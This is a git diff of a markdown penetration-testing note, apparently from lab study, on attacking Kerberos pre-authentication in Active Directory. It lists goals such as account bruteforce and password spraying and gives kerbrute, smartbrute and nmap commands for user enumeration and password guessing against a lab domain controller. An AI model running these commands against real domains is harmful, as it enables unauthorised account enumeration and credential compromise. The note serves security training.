@@ -1,8 +1,6 @@
-# Attack authentication
+# Pre-authentication Kerberos
 
-## Pre-authentication Kerberos
-
-### Objectives
+## Objectives
 
 * Bruteforce accounts
 * Password Spraying
@@ -20,7 +18,7 @@ If we know the derivated secret, we don't need to know the password to achieve p
 
 If pre-authentication is disabled, AS-REP Roasting is possible.
 
-### Kerbrute (go)
+## Kerbrute (go)
 
 ```
 sudo git clone https://github.com/ropnop/kerbrute.git
@@ -30,7 +28,7 @@ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
 kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
 ```
 
-### Alternative : Smartbrute (Python)
+## Alternative : Smartbrute (Python)
 
 ```
 # brute mode, users and passwords lists supplied
@@ -40,10 +38,12 @@ smartbrute.py brute -bU $USER_LIST -bP $PASSWORD_LIST kerberos -d $DOMAIN
 smartbrute.py smart -bP $PASSWORD_LIST ntlm -d $DOMAIN -u $USER -p $PASSWORD kerberos// Some code
 ```
 
-### Nmap
+## Nmap
 
 ```
 nmap -p 88 --script="krb5-enum-users" --script-args="krb5-enum-users.realm='$DOMAIN',userdb=$WORDLIST" $IP_DC
+
 ```
 
-\
+
+
